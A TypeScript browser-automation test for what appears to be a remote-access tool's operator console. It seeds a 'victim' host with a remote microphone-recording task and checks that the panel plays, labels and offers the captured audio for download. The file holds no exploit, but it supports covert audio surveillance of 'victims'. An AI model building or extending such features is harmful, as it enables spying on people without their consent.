// Verificación micrófono: reproducción completa, metadatos, descarga y error.
// Uso: npx tsx tests/verify-mic.ts
import { readFileSync } from 'node:fs';
import { chromium } from 'playwright-core';
import { authenticator } from 'otplib';
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();
const UI = 'http://127.0.0.1:3000';
const WEBM = readFileSync('/tmp/m.webm').toString('base64');

async function main() {
  const admin = await prisma.operator.findUniqueOrThrow({ where: { email: 'admin@spc.local' } });
  const victim = await prisma.victim.findFirstOrThrow({ where: { hostname: 'SEED-DESKTOP' } });
  const login = await fetch('http://127.0.0.1:4000/api/console/auth/login', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: 'admin@spc.local', password: 'screenshot-pass', totp: authenticator.generate(admin.totpSecret) })
  });
  if (!login.ok) throw new Error(await login.text());
  const cookie = login.headers.get('set-cookie')!.split(';')[0]!;

  const made: string[] = [];
  const make = async (status: string, result: Record<string, unknown>, error: string | null = null) => {
    const task = await prisma.task.create({ data: { victimId: victim.id, name: 'mic:record', status: status as never, params: { seconds: 15 }, result: result as never, error, finishedAt: new Date() } });
    made.push(task.id);
  };
  await make('done', { data: WEBM, bytes: 89967, seconds: 15, mime: 'audio/webm', device: 'Microphone' });

  const browser = await chromium.launch({ executablePath: '/usr/bin/chromium-browser', headless: true });
  const context = await browser.newContext({ viewport: { width: 1500, height: 950 } });
  const [name, value] = cookie.split('=');
  await context.addCookies([{ name: name!, value: value!, url: UI }]);
  const page = await context.newPage();
  await page.goto(`${UI}/victims?select=${victim.id}&tab=monitor`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(1500);

  const player = page.locator('[data-mic-player]');
  const present = await player.count();
  console.log('src', (await player.getAttribute('src'))?.slice(0, 60), (await player.getAttribute('src'))?.length);
  const duration = await player.evaluate((element) => new Promise<number>((resolve) => {
    const node = element as HTMLAudioElement;
    if (Number.isFinite(node.duration)) return resolve(node.duration);
    node.addEventListener('loadedmetadata', () => resolve(node.duration), { once: true });
    setTimeout(() => resolve(node.duration), 3000);
  }));
  await player.evaluate((element) => (element as HTMLAudioElement).play());
  await page.waitForTimeout(1200);
  const time = await player.evaluate((element) => (element as HTMLAudioElement).currentTime);
  const metadata = await page.locator('text=/15 s · .* KB · Microphone/').count();
  const download = await page.locator('a[download]').count();
  await page.getByRole('region', { name: 'Micrófono' }).scrollIntoViewIfNeeded();
  await page.screenshot({ path: '../docs/ui/after4-mic.png' });

  await make('error', {}, 'mic_unavailable: Could not find audio device with name [Microphone]');
  await page.waitForTimeout(2500);
  const errorVisible = await page.locator('[data-mic-error]').count();
  await page.screenshot({ path: '../docs/ui/after4-mic-error.png' });

  console.log(JSON.stringify({ player: present, duration, playedSeconds: Number(time.toFixed(1)), metadata, download, errorVisible }, null, 2));

  await prisma.task.deleteMany({ where: { id: { in: made } } });
  await browser.close();
  await prisma.$disconnect();
}

main().catch(async (error) => { console.error(error); await prisma.$disconnect(); process.exit(1); });
